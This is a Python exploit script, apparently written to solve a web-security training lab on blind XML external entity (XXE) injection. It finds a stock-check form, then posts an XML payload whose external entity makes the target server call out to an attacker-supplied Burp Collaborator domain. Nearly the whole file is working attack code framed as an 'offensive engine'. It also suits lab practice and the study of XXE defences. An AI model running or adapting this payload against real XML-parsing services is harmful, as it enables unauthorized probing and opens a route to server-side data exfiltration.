#!/usr/bin/env python3
# === Blind XXE with OOB Interaction (Burp Collaborator) ===

import requests
from bs4 import BeautifulSoup
import sys

def banner():
    print("\n=== 👁️ Blind XXE with Burp Collaborator OOB Detection ===")
    print(">>> Shadow Junior 😈 | GANGA Offensive Engine")
    print(">>> Target: Trigger DNS/HTTP interaction to detect blind XXE\n")

def get_lab_url():
    try:
        url = input("🔗 Enter the full lab URL (e.g., https://xyz.web-security-academy.net): ").strip()
        if not url.startswith("http"):
            raise ValueError("Invalid URL format.")
        return url.rstrip('/')
    except Exception as e:
        print(f"[!] Input Error: {e}")
        sys.exit(1)

def get_collaborator_domain():
    try:
        domain = input("🌐 Enter your Burp Collaborator domain (e.g., xyz123.burpcollaborator.net): ").strip()
        if not domain.endswith(".burpcollaborator.net"):
            raise ValueError("Must be a valid Burp Collaborator subdomain.")
        return domain
    except Exception as e:
        print(f"[!] Invalid domain: {e}")
        sys.exit(1)

def resolve_stock_url(base_url):
    print("[*] Discovering stock check form action...")
    try:
        r = requests.get(f"{base_url}/product?productId=1", timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        action = form.get("action")
        if not action:
            raise Exception("No form action found.")
        return base_url + action
    except Exception as e:
        print(f"[!] Form resolution failed: {e}")
        sys.exit(1)

def craft_xxe_blind_payload(collab_domain):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
    <!ENTITY xxe SYSTEM "http://{collab_domain}">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>"""

def send_xxe(post_url, xml_payload):
    headers = {
        "Content-Type": "application/xml"
    }
    try:
        response = requests.post(post_url, data=xml_payload, headers=headers, timeout=10)
        if response.status_code in [200, 500]:
            print("[✓] Payload sent. Now check Burp Collaborator for DNS/HTTP interaction.")
        else:
            print(f"[✗] Unexpected status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Payload delivery error: {e}")

def main():
    banner()
    base_url = get_lab_url()
    collab_domain = get_collaborator_domain()
    stock_url = resolve_stock_url(base_url)
    payload = craft_xxe_blind_payload(collab_domain)
    print(f"[+] Sending blind XXE payload to: {stock_url}")
    send_xxe(stock_url, payload)

if __name__ == "__main__":
    main()
